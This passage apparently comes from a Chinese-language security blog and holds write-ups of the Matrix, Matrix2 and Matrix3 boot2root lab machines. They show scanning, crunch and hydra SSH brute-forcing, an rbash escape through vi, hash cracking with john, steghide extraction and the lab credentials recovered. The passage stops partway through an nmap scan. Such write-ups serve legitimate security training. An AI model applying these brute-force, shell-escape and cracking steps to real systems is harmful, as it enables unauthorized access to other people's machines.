<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ ++.&lt;+ +++[- &gt;++++ &lt;]&gt;++ ++++. +++++</span><br><span class="line">+.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;--- -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++.-</span><br><span class="line">-.&lt;++ +[-&gt;+ ++&lt;]&gt; ++++. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- --.&lt;+</span><br><span class="line">+++++ ++[-&gt; +++++ +++&lt;] &gt;++++ +.+++ +++++ +.+++ +++.&lt; +++[- &gt;---&lt; ]&gt;---</span><br><span class="line">---.&lt; +++[- &gt;+++&lt; ]&gt;+++ +.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;-.&lt; +++++ +++[-</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">++++ ++++&lt; ]&gt;+++ +++++ +.+++ ++.++ ++++. ----- .&lt;+++ +++++ [-&gt;-- -----</span></span><br><span class="line">-&lt;]&gt;- ----- ----- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ +.&lt;++</span><br><span class="line">+[-&gt;- --&lt;]&gt; ---.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ ++.-- .---- ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+</span><br><span class="line">+++++ .&lt;+++ +++++ +[-&gt;- ----- ---&lt;] &gt;---- ---.&lt; +++++ +++[- &gt;++++ ++++&lt;</span><br><span class="line"><span class="meta">]&gt;</span><span class="bash">+.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;--. &lt;++++ ++++[</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash">+++ +++++ &lt;]&gt;++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; .&lt;+++</span></span><br><span class="line"><span class="meta">[-&gt;</span><span class="bash">++ +&lt;]&gt;+ ++++. +.&lt;++ +++++ +[-&gt;- ----- --&lt;]&gt; ----- ---.&lt; +++[- &gt;---&lt;</span></span><br><span class="line"><span class="meta">]&gt;</span><span class="bash">--- .&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;++++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++</span></span><br><span class="line">+[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; ---&lt;] &gt;---. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- -----</span><br><span class="line">-.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++++ +++++ +++++ +.&lt;++ +[-&gt;- --&lt;]&gt; -----</span><br><span class="line">-.&lt;++ ++[-&gt; ++++&lt; ]&gt;++. .++++ .---- ----. +++.&lt; +++[- &gt;---&lt; ]&gt;--- --.&lt;+</span><br><span class="line">+++++ ++[-&gt; ----- ---&lt;] &gt;---- .&lt;+++ +++++ [-&gt;++ +++++ +&lt;]&gt;+ +++++ +++++</span><br><span class="line">.&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- ----- -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;++ +++++</span><br><span class="line">+++.. &lt;++++ +++[- &gt;---- ---&lt;] &gt;---- ----- --.&lt;+ +++++ ++[-&gt; +++++ +++&lt;]</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">++.&lt; +++++ [-&gt;-- ---&lt;] &gt;-..&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- ----- ---.-</span></span><br><span class="line">--.&lt;+ +++++ ++[-&gt; +++++ +++&lt;] &gt;++++ .&lt;+++ ++[-&gt; +++++ &lt;]&gt;++ +++++ +.+++</span><br><span class="line">++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----. &lt;++++ +[-&gt;-</span><br><span class="line">----&lt; ]&gt;-.&lt; +++++ [-&gt;++ +++&lt;] &gt;++++ ++++. &lt;++++ +[-&gt;+ ++++&lt; ]&gt;+++ +++++</span><br><span class="line">+.&lt;++ ++[-&gt; ++++&lt; ]&gt;+.+ .&lt;+++ +[-&gt;- ---&lt;] &gt;---- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +..&lt;+</span><br><span class="line">++[-&gt; +++&lt;] &gt;++++ .&lt;+++ +++++ [-&gt;-- ----- -&lt;]&gt;- ----- ----- --.&lt;+ ++[-&gt;</span><br><span class="line">---&lt;] &gt;---. &lt;++++ ++[-&gt; +++++ +&lt;]&gt;+ ++++. &lt;++++ ++[-&gt; ----- -&lt;]&gt;- ----.</span><br><span class="line">&lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ ++++. +++++ ++++. +++.&lt; +++[- &gt;---&lt; ]&gt;--.</span><br><span class="line">--.&lt;+ ++[-&gt; +++&lt;] &gt;++++ ++.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-- -.&lt;++ +++++</span><br><span class="line">+[-&gt;+ +++++ ++&lt;]&gt; +++++ +++++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;--.&lt; ++++[ -&gt;+++ +&lt;]&gt;+</span><br><span class="line">+.+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++</span><br><span class="line">+.+++ .---- ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- ---.&lt; +++++</span><br><span class="line">+++[- &gt;++++ ++++&lt; ]&gt;+++ .++++ +.--- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; +.&lt;++ ++[-&gt;</span><br><span class="line">----&lt; ]&gt;-.+ +.&lt;++ ++[-&gt; ++++&lt; ]&gt;+.&lt; +++[- &gt;---&lt; ]&gt;--- ---.&lt; +++[- &gt;+++&lt;</span><br><span class="line"><span class="meta">]&gt;</span><span class="bash">+++ +.+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- -.&lt;++ +++++ ++[-&gt; +++++ ++++&lt;</span></span><br><span class="line"><span class="meta">]&gt;</span><span class="bash">++. ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- ---.&lt; +++++ +[-&gt;+</span></span><br><span class="line">+++++ &lt;]&gt;++ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ---.&lt; +++++ +++[- &gt;++++ ++++&lt;</span><br><span class="line"><span class="meta">]&gt;</span><span class="bash">+++ +++++ .---- ---.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; -.&lt;++</span></span><br><span class="line">+++++ +[-&gt;- ----- --&lt;]&gt; ----- .&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;+.&lt;+ ++[-&gt;</span><br><span class="line">---&lt;] &gt;---- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +.--- -.&lt;++ +[-&gt;- --&lt;]&gt; --.++ .++.- .&lt;+++</span><br><span class="line">+++++ [-&gt;-- ----- -&lt;]&gt;- ---.&lt; +++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ .&lt;+++</span><br><span class="line"><span class="meta">[-&gt;</span><span class="bash">-- -&lt;]&gt;- ----. &lt;+++[ -&gt;+++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++ ++[-&gt;</span></span><br><span class="line">----- ---&lt;] &gt;---- ----. &lt;++++ +++[- &gt;++++ +++&lt;] &gt;++++ +++.. &lt;++++ +++[-</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">---- ---&lt;] &gt;---- ---.&lt; +++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ ++.-- .++++ +++.&lt;</span></span><br><span class="line">+++++ ++++[ -&gt;--- ----- -&lt;]&gt;- ----- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++</span><br><span class="line">+++++ +.&lt;++ +[-&gt;- --&lt;]&gt; -.+++ +++.- --.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-.</span><br><span class="line">&lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ .++++ +++++ .&lt;+++ +[-&gt;- ---&lt;]</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">--.+ +++++ ++.&lt;+ +++++ ++[-&gt; ----- ---&lt;] &gt;---- ----- --.&lt;+ +++++ ++[-&gt;</span></span><br><span class="line">+++++ +++&lt;] &gt;+.&lt;+ ++[-&gt; +++&lt;] &gt;++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .&lt;+++ +++++ [-&gt;--</span><br><span class="line">----- -&lt;]&gt;- ---.&lt; +++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +++.+ ++.++ +++.&lt; +++[-</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">---&lt; ]&gt;-.&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt;</span></span><br><span class="line">+++.&lt; +++[- &gt;+++&lt; ]&gt;+++ .+++. .&lt;+++ [-&gt;-- -&lt;]&gt;- ---.- -.&lt;++ ++[-&gt; ++++&lt;</span><br><span class="line"><span class="meta">]&gt;</span><span class="bash">+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++</span></span><br><span class="line">.+.-- .---- ----- .++++ +.--- ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- -----</span><br><span class="line">.&lt;+++ +++++ [-&gt;++ +++++ +&lt;]&gt;+ +++++ +++++ ++++. ----- ----. &lt;++++ ++++[</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash">--- ----- &lt;]&gt;-- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ ++++.</span></span><br><span class="line">&lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; ++..+ +++.- ----- --.++ +.&lt;++</span><br><span class="line">+[-&gt;- --&lt;]&gt; ----- .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- --.&lt;+ ++++[ -&gt;--- --&lt;]&gt;</span><br><span class="line">----- ---.- --.&lt;</span><br></pre></td></tr></table></figure>

<ul>
<li>莫名奇妙的编码(brainfuck编码)</li>
</ul>
<p><img data-src="./Machine_Matrix/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">You can enter into matrix as guest, with password k1ll0rXX</span><br><span class="line">Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.</span><br></pre></td></tr></table></figure>

<h3 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h3><ul>
<li>先尝试后两位 为字母</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# crunch 8 8 -t k1ll0r@@ -o password.txt</span><br><span class="line">Crunch will now generate the following amount of data: 6084 bytes</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 676 </span><br><span class="line"></span><br><span class="line">crunch: 100% completed generating output</span><br></pre></td></tr></table></figure>

<ul>
<li>hydra</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l guest -P password.txt -t 2 -vV -e ns 192.168.1.107 ssh</span><br></pre></td></tr></table></figure>

<ul>
<li>无结果后尝试 后两位为 数字+字母</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 8 8 -t k1ll0r%@ -o password1.txt</span><br><span class="line"></span><br><span class="line">hydra -l guest -P password1.txt -t 2 -vV -e ns 192.168.1.107 ssh</span><br></pre></td></tr></table></figure>

<p><img data-src="./Machine_Matrix/7.png" alt></p>
<p>得到账号密码 <code>guest / k1ll0r7n</code></p>
<h3 id="登入后台"><a href="#登入后台" class="headerlink" title="登入后台"></a>登入后台</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh guest@192.168.1.107</span><br></pre></td></tr></table></figure>

<p><img data-src="./Machine_Matrix/8.png" alt></p>
<ul>
<li><p><code>echo $PATH</code> 发现可执行权限的路径</p>
</li>
<li><p><code>echo $PATH/*</code> 发现可执行的命令</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi rbash 逃逸 </span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>

<p><img data-src="./Machine_Matrix/9.png" alt></p>
<p><img data-src="./Machine_Matrix/10.png" alt></p>
<ul>
<li>发现另一个用户</li>
</ul>
<p><img data-src="./Machine_Matrix/11.png" alt></p>
<ul>
<li><p><del>利用<code>python</code>水平越权(糊涂了失败)</del></p>
</li>
<li><p><del><code>./python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></del></p>
</li>
<li><p>查找<code>sudo</code>文件</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:/usr/bin</span><br><span class="line">export PATH=$PATH:/bin</span><br></pre></td></tr></table></figure>

<p><img data-src="./Machine_Matrix/12.png" alt></p>
<p><img data-src="./Machine_Matrix/13.png" alt></p>
<p>ok!</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Matrix</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Matrix</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine_Matrix2</title>
    <url>/2021/02/19/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Machine_Matrix2/</url>
    <content><![CDATA[<h1 id="Machine-Matrix2"><a href="#Machine-Matrix2" class="headerlink" title="Machine_Matrix2"></a>Machine_Matrix2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Machine_Matrix2</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.1.100</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d0:76:e7:45:6f:f9       TP-LINK TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.1.101   00:0c:29:c2:a6:05       VMware, Inc.</span><br><span class="line">192.168.1.105   38:d5:47:11:43:e9       ASUSTek COMPUTER INC.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.981 seconds (129.23 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.1.101</li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.101</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.1.101</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-19 01:42 EST</span><br><span class="line">Nmap scan report for 192.168.1.101</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">80/tcp    open  http               nginx 1.10.3</span><br><span class="line">|_http-server-header: nginx/1.10.3</span><br><span class="line">|_http-title: Welcome in Matrix v2 Neo</span><br><span class="line">1337/tcp  open  ssl/http           nginx</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=Welcome to Matrix 2</span><br><span class="line">|_http-title: 401 Authorization Required</span><br><span class="line">| ssl-cert: Subject: commonName=nginx-php-fastcgi</span><br><span class="line">| Subject Alternative Name: DNS:nginx-php-fastcgi</span><br><span class="line">| Not valid before: 2018-12-07T14:14:44</span><br><span class="line">|_Not valid after:  2028-12-07T14:14:44</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line">12320/tcp open  ssl/http           ShellInABox</span><br><span class="line">|_http-title: Shell In A Box</span><br><span class="line">| ssl-cert: Subject: commonName=nginx-php-fastcgi</span><br><span class="line">| Subject Alternative Name: DNS:nginx-php-fastcgi</span><br><span class="line">| Not valid before: 2018-12-07T14:14:44</span><br><span class="line">|_Not valid after:  2028-12-07T14:14:44</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">12321/tcp open  ssl/warehouse-sss?</span><br><span class="line">| ssl-cert: Subject: commonName=nginx-php-fastcgi</span><br><span class="line">| Subject Alternative Name: DNS:nginx-php-fastcgi</span><br><span class="line">| Not valid before: 2018-12-07T14:14:44</span><br><span class="line">|_Not valid after:  2028-12-07T14:14:44</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">12322/tcp open  ssl/http           nginx</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_file_view.php</span><br><span class="line">|_http-title: Welcome in Matrix v2 Neo</span><br><span class="line">| ssl-cert: Subject: commonName=nginx-php-fastcgi</span><br><span class="line">| Subject Alternative Name: DNS:nginx-php-fastcgi</span><br><span class="line">| Not valid before: 2018-12-07T14:14:44</span><br><span class="line">|_Not valid after:  2028-12-07T14:14:44</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line">MAC Address: 00:0C:29:C2:A6:05 (VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=2/19%OT=80%CT=1%CU=38560%PV=Y%DS=1%DC=D%G=Y%M=000C29%T</span><br><span class="line">OS:M=602F5DEA%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=Z%II=I</span><br><span class="line">OS:%TS=U)OPS(O1=M5B4NNSNW7%O2=M5B4NNSNW7%O3=M5B4NW7%O4=M5B4NNSNW7%O5=M5B4NN</span><br><span class="line">OS:SNW7%O6=M5B4NNS)WIN(W1=7210%W2=7210%W3=7210%W4=7210%W5=7210%W6=7210)ECN(</span><br><span class="line">OS:R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS</span><br><span class="line">OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=</span><br><span class="line">OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=</span><br><span class="line">OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T</span><br><span class="line">OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=</span><br><span class="line">OS:S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.37 ms 192.168.1.101</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 45.35 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Machine_Matrix2/1.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./Machine_Matrix2/2.png" alt></p>
<ul>
<li><p><code>80</code>端口未发现特别的东西</p>
</li>
<li><p><code>1337</code>端口</p>
</li>
</ul>
<p><img data-src="./Machine_Matrix2/3.png" alt></p>
<ul>
<li><code>12320 12321 12322</code> 端口</li>
</ul>
<p><img data-src="./Machine_Matrix2/4.png" alt><br><img data-src="./Machine_Matrix2/5.png" alt></p>
<p><img data-src="./Machine_Matrix2/6.png" alt></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><img data-src="./Machine_Matrix2/7.png" alt></p>
<ul>
<li>发现不能解析</li>
<li>尝试改变请求方法为 <code>POST</code></li>
</ul>
<p><img data-src="./Machine_Matrix2/8.png" alt></p>
<ul>
<li>获取关键密码信息</li>
</ul>
<p><img data-src="./Machine_Matrix2/9.png" alt></p>
<p><img data-src="./Machine_Matrix2/10.png" alt></p>
<p><img data-src="./Machine_Matrix2/11.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Tr1n17y:$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0</span><br></pre></td></tr></table></figure>

<h3 id="john破解密码"><a href="#john破解密码" class="headerlink" title="john破解密码"></a>john破解密码</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john --w:password.lst -- format=sha512crypt/root/Desktop/shadow</span><br><span class="line"></span><br><span class="line">john 1.txt --show</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/work/test# john 1.txt --show</span><br><span class="line">Tr1n17y:admin</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure>

<ul>
<li>获得账号密码 <code>Tr1n17y / admin</code></li>
</ul>
<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><ul>
<li><del>后台 <code>ssh</code> 并没有开启</del></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh Tr1n17y@192.168.1.101</span><br></pre></td></tr></table></figure>

<ul>
<li>访问<code>12320</code>端口，失败</li>
<li>访问<code>1337</code>端口</li>
</ul>
<p><img data-src="./Machine_Matrix2/12.png" alt></p>
<ul>
<li>右键查看源代码，发现隐藏图片<code>h1dd3n.jpg</code></li>
</ul>
<p><img data-src="./Machine_Matrix2/13.png" alt></p>
<ul>
<li>获取隐藏图片</li>
</ul>
<p><img data-src="./Machine_Matrix2/14.png" alt></p>
<h3 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install steghide -y</span><br><span class="line"></span><br><span class="line">steghide info h1dd3n.jpg</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/work/test# steghide info h1dd3n.jpg</span><br><span class="line">"h1dd3n.jpg":</span><br><span class="line">  format: jpeg</span><br><span class="line">  capacity: 1.3 KB</span><br><span class="line">Try to get information about embedded data ? (y/n) y</span><br><span class="line">Enter passphrase: </span><br><span class="line">  embedded file "n30.txt":</span><br><span class="line">    size: 9.0 Byte</span><br><span class="line">    encrypted: rijndael-128, cbc</span><br><span class="line">    compressed: yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">steghide extract -sf h1dd3n.jpg</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/work/test# steghide extract -sf h1dd3n.jpg </span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to "n30.txt".</span><br><span class="line"></span><br><span class="line">root@kali:/home/caixin/work/test# cat n30.txt </span><br><span class="line"><span class="meta">P4$</span><span class="bash"><span class="variable">$w0rd</span></span></span><br></pre></td></tr></table></figure>

<p>备注: 密码为 <code>n30</code></p>
<p><img data-src="./Machine_Matrix2/15.png" alt></p>
<ul>
<li>获取账号密码 <code>n30 / P4$$w0rd</code> </li>
</ul>
<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><ul>
<li>访问<code>12320</code>端口，失败</li>
</ul>
<p><img data-src="./Machine_Matrix2/16.png" alt></p>
<ul>
<li>提权 拿 <code>flag</code></li>
</ul>
<p><img data-src="./Machine_Matrix2/17.png" alt></p>
<p><img data-src="./Machine_Matrix2/18.png" alt></p>
<p><img data-src="./Machine_Matrix2/19.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Matrix</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Matrix</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine_Matrix3</title>
    <url>/2021/02/19/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Machine_Matrix3/</url>
    <content><![CDATA[<h1 id="Machine-Matrix3"><a href="#Machine-Matrix3" class="headerlink" title="Machine_Matrix3"></a>Machine_Matrix3</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Machine_Matrix3</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/work/test# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.1.100</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d0:76:e7:45:6f:f9       TP-LINK TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.1.105   38:d5:47:11:43:e9       ASUSTek COMPUTER INC.</span><br><span class="line">192.168.1.110   00:0c:29:17:3f:b4       VMware, Inc.</span><br><span class="line">192.168.1.106   e0:37:bf:cb:11:26       Wistron Neweb Corporation</span><br><span class="line">192.168.1.102   e0:1f:88:f2:2f:3f       Xiaomi Communications Co Ltd</span><br><span class="line">192.168.1.106   e0:37:bf:cb:11:26       Wistron Neweb Corporation (DUP: 2)</span><br><span class="line">192.168.1.107   a4:45:19:d4:47:99       Xiaomi Communications Co Ltd</span><br><span class="line">192.168.1.104   30:45:96:e4:ed:56       HUAWEI TECHNOLOGIES CO.,LTD</span><br><span class="line"></span><br><span class="line">8 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.970 seconds (129.95 hosts/sec). 8 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.1.110</li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.110</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/work/test# nmap -sV -A -p 1-65535 192.168.1.110</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-19 06:04 EST</span><br><span class="line">Nmap scan report for 192.168.1.110</span><br><span class="line">Host is up (0.00062s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">80/tcp   open     http    SimpleHTTPServer 0.6 (Python 2.7.14)</span><br><span class="line">|_http-title: Welcome in Matrix</span><br><span class="line">6464/tcp open     ssh     OpenSSH 7.7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)</span><br><span class="line">|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)</span><br><span class="line">|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)</span><br><span class="line">7331/tcp filtered swx</span><br><span class="line">MAC Address: 00:0C:29:17:3F:B4 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 